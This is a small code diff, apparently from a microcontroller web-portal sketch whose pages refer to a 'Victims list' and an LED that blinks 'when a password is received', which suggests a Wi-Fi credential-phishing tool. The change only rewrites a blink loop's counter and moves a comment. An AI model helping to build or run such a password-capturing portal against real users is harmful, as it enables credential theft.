@@ -89,9 +89,9 @@ String clear() {
   return header(CLEAR_TITLE) + "<div><p>The Victims list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
-void BLINK() { // The internal LED will blink 3 times when a password is received.
-  int count = 0;
-  while (count <= 2) {
+void BLINK() { 
+  int count = 1;
+  while (count <= 3) {   // The internal LED will blink 3 times when a password is received.
     digitalWrite(BUILTIN_LED, LOW);
     delay(500);
     digitalWrite(BUILTIN_LED, HIGH);
